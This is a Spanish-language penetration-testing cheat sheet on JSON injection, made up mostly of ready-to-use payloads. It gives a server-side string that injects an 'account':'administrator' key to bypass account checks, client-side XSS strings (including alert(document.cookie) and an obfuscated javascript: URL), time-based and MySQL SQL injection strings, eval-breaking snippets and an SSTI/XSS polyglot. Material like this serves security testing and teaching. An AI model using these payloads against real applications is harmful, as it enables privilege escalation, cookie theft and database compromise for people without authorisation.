# JSON Injection

## Summary
- [Inyección JSON del lado del Servidor](#inyeccion-json-del-lado-del-servidor)
  - [Bypass de Cuenta](#bypass-de-cuenta)
- [Inyección JSON del lado del Cliente](#inyeccion-json-del-lado-del-cliente)
  - [XSS JSON](#xss-json)
  - [SQLi JSON](#sqli-json)
  - [Reference Error Fix](#reference-error-fix)
  - [SSTI](#ssti)

***

Se pueden describir dos tipos de problemas de seguridad:

## Inyección JSON del lado del Servidor

La inyección JSON del lado del servidor ocurre cuando el servidor no desinfecta los datos de una fuente que no es de confianza y los escribe directamente en un flujo JSON.

### Bypass de Cuenta
```
john%22,%22account%22:%22administrator%22
```

La cadena JSON resultante es:
```
{
  "account":"user",
  "user":"john",
  "account":"administrator",
  "pass":"password"
}
```

***

## Inyección JSON del lado del Cliente

La inyección JSON del lado del cliente ocurre cuando los datos de una fuente JSON que no es de confianza no se desinfectan y analizan directamente con la función "eval" de JavaScript .

### XSS JSON

Note los valores `user` y `account`, deberían ser los propios del escenario que está analizando.
```
user"});alert(document.cookie);({"account":"user
```
```
1\'/[location=`Javas\x63ript:\x63onfirm\x60K\x60`]//
```

### SQLi JSON
```
{"user_id": "5755 and sleep(12)=1", "receiver": "yourmail@mymail"}
```
```
{"param":"1')))+MySQL_payload--+-"}
```

### Reference Error Fix

Úselo para corregir la sintaxis de algunos códigos javascript.

Compruebe la pestaña de la consola en las herramientas de desarrollo del navegador (F12) para el error de referencia respectivo (`ReferenceError`) y reemplace `var` y `myFunc` en consecuencia:
```
';alert(1);var myObj='
';alert(1);function myFunc(){}'
```

### SSTI
```
${alert(1)}<svg onload=eval('`//'+URL)>
```
